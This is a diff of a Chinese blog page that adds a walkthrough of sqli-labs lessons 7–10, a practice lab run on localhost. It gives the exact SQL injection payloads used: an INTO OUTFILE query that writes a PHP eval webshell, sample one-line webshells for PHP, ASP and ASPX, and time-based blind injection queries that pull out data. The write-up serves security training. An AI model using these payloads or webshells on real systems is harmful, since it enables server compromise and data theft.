@@ -22,7 +22,7 @@
 <meta name="theme-color" content="#ffffff" />
 
 
-<title>404 Page not found - Phoenix-Pl’s Blog</title>
+<title>Sqli-labs-less 7-10 - Phoenix-Pl’s Blog</title>
 
 
 <meta name="author" content="DSRKafuU" />
@@ -31,13 +31,16 @@
 <meta name="description" content="A minimal Hugo theme with nice theme color." />
 
 
+<meta name="keywords" content="Sqli-labs" />
 
-<meta property="og:title" content="404 Page not found" />
-<meta name="twitter:title" content="404 Page not found" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://Phoenix-Pl.github.io/404.html" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+
+<meta property="og:title" content="Sqli-labs-less 7-10" />
+<meta name="twitter:title" content="Sqli-labs-less 7-10" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://Phoenix-Pl.github.io/post/sqli-labs-less7-10/" /><meta property="og:description" content="less-07 前置知识 由于是用 phpstudy 搭建的，所以需要进行一些配置 1、在mysql命令行中输入show variables like &#39;%secure%&#39;;查看secure-file-priv 如果为NULL 则需要在 ././Mysql/my.ini 文件中加上一句secure_f" />
+<meta name="twitter:description" content="less-07 前置知识 由于是用 phpstudy 搭建的，所以需要进行一些配置 1、在mysql命令行中输入show variables like &#39;%secure%&#39;;查看secure-file-priv 如果为NULL 则需要在 ././Mysql/my.ini 文件中加上一句secure_f" /><meta property="og:image" content="https://Phoenix-Pl.github.io/img/og.png" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" />
+<meta name="twitter:image" content="https://Phoenix-Pl.github.io/img/og.png" /><meta property="article:published_time" content="2020-05-11T00:00:00+00:00" /><meta property="article:modified_time" content="2020-05-11T00:00:00+00:00" />
 
 
 <style>
@@ -92,9 +95,116 @@
             
             <div class="col-12 col-md-9 float-left content">
                 
-<div class="404-not-found" style="font-size: 2rem; padding-top: 1.5rem;">
-    <span>404 NOT FOUND</span>
+<article>
+    
+    <h2 class="post-item post-title">
+        <a href="https://Phoenix-Pl.github.io/post/sqli-labs-less7-10/">Sqli-labs-less 7-10</a>
+    </h2>
+    <div class="post-item post-meta">
+        <span><i class="iconfont icon-today-sharp"></i>&nbsp;2020-05-11</span><span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;783 字</span><span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href="/tags/sqli-labs">Sqli-labs</a>&nbsp;</span>
+
+    </div>
+    
+    <div class="post-content markdown-body">
+        <h3 id="less-07">less-07</h3>
+<p><strong>前置知识</strong></p>
+<p>由于是用 <em>phpstudy</em> 搭建的，所以需要进行一些配置</p>
+<p>1、在mysql命令行中输入<code>show variables like '%secure%';</code>查看<code>secure-file-priv</code> 如果为<code>NULL</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201025111633799.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>则需要在 <code>././Mysql/my.ini</code> 文件中加上一句<code>secure_file_priv=&quot;/&quot;</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201025112530136.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后保存，再输入一下指令，发现</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028072502331.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>这里说一下知识点</strong></p>
+<blockquote>
+<p>secure-file-priv特性
+secure-file-priv参数是用来限制LOAD DATA, SELECT &hellip; OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
+<ul>
+<li>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li>
+<li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li>
+<li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li>
+</ul>
+<p>如何查看secure-file-priv参数的值：</p>
+<pre><code class="language-sql">在命令行中输入
+show global variables like '%secure%';
+</code></pre>
+</blockquote>
+<blockquote>
+<p>常见一句话木马</p>
+<pre><code class="language-php">php的一句话木马： &lt;?php @eval($_POST['pass']);?&gt; 
+asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt; 
+aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt; 
+</code></pre>
+<p>详情请看这位师傅的<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765" target="_blank">链接</a></p>
+</blockquote>
+<p><strong>下面就可以开始第七关了</strong></p>
+<p>先测试一下</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-7/?id=1
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102511024582.png#pic_center" alt="在这里插入图片描述" />
+
+发现这里提示<code>Use outfile</code>，那我们就从这里入手</p>
+<p>第一步还是和之前一样，先找出闭合方式</p>
+<p>经过试验发现闭合方式应该是<code>'))</code> 如图</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028213212156.png#pic_center" alt="在这里插入图片描述" />
+
+<code>http://localhost/sqli-labs-master/Less-7/?id=1'))   order by 3--+</code> 判断出为三列</p>
+<p>然后构造payload,放入一句话木马</p>
+<p><code>http://localhost/sqli-labs-master/Less-7/?id=1')) union select 1,2,'&lt;?php @eval($_POST[&quot;crow&quot;]);?&gt;' into outfile &quot;E:\\phpstudy\\phpstudy_pro\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php&quot; --+</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028214417325.png#pic_center" alt="在这里插入图片描述" />
+
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102821452510.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后蚁剑连接，拿下</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028214656512.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<h3 id="less-08">less-08</h3>
+<p>先输个1测试一下</p>
+<p><code>http://localhost/sqli-labs-master/Less-8/?id=1</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028220312763.png#pic_center" alt="在这里插入图片描述" />
+
+这又是 <code>You are in...........</code> 好家伙，思路明确了，<strong>盲注</strong></p>
+<p>这里尝试出闭合方式是 <code>'</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201028220356778.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>剩下的和第五关十分相似，可参考第五关</p>
+<h3 id="less-09">less-09</h3>
+<p>此关名字为单引号时间盲注，其实也是和第五关一个意思，下面就写一句，后面的一样</p>
+<p><strong>猜库名</strong></p>
+<p>库名第一位是s</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-9/?id=1' and If(ascii(substr(database(),2,1))=115,1,sleep(10))--+
+</code></pre>
+<p><strong>猜表名</strong></p>
+<p>表名第一位是u</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=117,1,sleep(10))--+
+</code></pre>
+<p><strong>猜字段名</strong></p>
+<p>字段名第一位是u</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=117,1,sleep(10))--+
+</code></pre>
+<p><strong>猜数据</strong></p>
+<p>数据第一位是D</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))--+
+</code></pre>
+<p>后面逐步拆解即可</p>
+<h3 id="less-10">less-10</h3>
+<p>这关变成了基于时间的双引号盲注，后面和第九关一样，不做解释了</p>
+
+    </div>
+</article>
+
+
+<div class="license markdown-body">
+    <blockquote>
+        <p>除特殊注明部分，本站内容采用 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
+               target="_blank">CC BY-NC-SA 4.0</a> 进行许可。</p>
+    </blockquote>
 </div>
+
+
 
             </div>
             <aside class="col-12 col-md-3 float-left sidebar">
@@ -183,9 +293,19 @@
             
         </div>
     </div>
-    
-    
-    
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-07">less-07</a></li>
+        <li><a href="#less-08">less-08</a></li>
+        <li><a href="#less-09">less-09</a></li>
+        <li><a href="#less-10">less-10</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
 </aside>
         </div>
         <div class="btn">
@@ -285,6 +405,24 @@
             </span>
             
         </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-07">less-07</a></li>
+        <li><a href="#less-08">less-08</a></li>
+        <li><a href="#less-09">less-09</a></li>
+        <li><a href="#less-10">less-10</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
     </div>
     
     
